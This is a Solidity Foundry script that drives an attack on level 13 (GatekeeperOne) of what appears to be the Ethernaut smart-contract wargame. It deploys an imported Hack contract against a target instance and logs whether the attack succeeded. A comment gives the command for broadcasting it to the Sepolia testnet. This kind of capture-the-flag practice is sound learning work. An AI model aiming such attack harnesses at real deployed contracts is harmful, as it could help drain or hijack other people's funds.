// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, GatekeeperOne} from "../src/level13.sol";

contract Level13Script is Script {
    function run(address instanceAddress) external {
        GatekeeperOne target = GatekeeperOne(instanceAddress);
        address entrantBefore = target.entrant();
        console.log("Entrant before: ", entrantBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack();
        vm.stopBroadcast();

        address entrantAfter = target.entrant();
        console.log("Entrant after: ", entrantAfter);
        console.log("Attack successful: ", entrantAfter != address(0));
    }
}
//forge script script/level13.s.sol:Level13Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
